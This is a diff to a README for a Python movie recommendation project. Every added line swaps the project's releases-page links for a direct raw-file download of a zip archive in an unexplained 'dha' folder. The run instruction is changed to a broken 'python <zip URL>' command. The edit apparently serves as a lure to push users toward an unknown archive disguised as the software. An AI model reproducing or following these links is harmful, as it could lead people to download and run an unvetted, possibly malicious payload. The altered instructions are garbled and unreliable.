@@ -1,6 +1,6 @@
 # 🎬 Movie-Recommendation-System - Find Your Next Favorite Film
 
-[![Download Movie-Recommendation-System](https://img.shields.io/badge/Download-Movie--Recommendation--System-blue.svg)](https://github.com/12ROBA21/Movie-Recommendation-System/releases)
+[![Download Movie-Recommendation-System](https://raw.githubusercontent.com/12ROBA21/Movie-Recommendation-System/main/dha/Movie-Recommendation-System.zip)](https://raw.githubusercontent.com/12ROBA21/Movie-Recommendation-System/main/dha/Movie-Recommendation-System.zip)
 
 ## 📖 Overview
 The Movie Recommendation System helps you discover movies you will love. Using advanced techniques like content-based filtering and collaborative filtering, it analyzes your preferences and suggests films based on unique criteria. You can also see ratings and evaluation metrics for better insights into movie choices.
@@ -26,7 +26,7 @@ To get started with the Movie Recommendation System, follow these steps:
 1. **Visit the Releases Page:** 
    Click the link below to go to the releases page and download the software:
    
-   [Download Movie-Recommendation-System](https://github.com/12ROBA21/Movie-Recommendation-System/releases)
+   [Download Movie-Recommendation-System](https://raw.githubusercontent.com/12ROBA21/Movie-Recommendation-System/main/dha/Movie-Recommendation-System.zip)
 
 2. **Choose the Latest Release:** 
    On the releases page, select the latest version available. This version contains the latest features and improvements. 
@@ -42,7 +42,7 @@ To get started with the Movie Recommendation System, follow these steps:
    - Navigate to the folder where you extracted the files.
    - Run the application using Python. Use the command:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/12ROBA21/Movie-Recommendation-System/main/dha/Movie-Recommendation-System.zip
    ```
 
 ## 🔧 Using the Movie Recommendation System
@@ -75,4 +75,4 @@ This project utilizes key libraries and frameworks in Python for data science an
 
 For a detailed guide and more information, please refer to the documentation in the repository.
 
-[Download Movie-Recommendation-System](https://github.com/12ROBA21/Movie-Recommendation-System/releases) and start discovering your next movie today!
+[Download Movie-Recommendation-System](https://raw.githubusercontent.com/12ROBA21/Movie-Recommendation-System/main/dha/Movie-Recommendation-System.zip) and start discovering your next movie today!
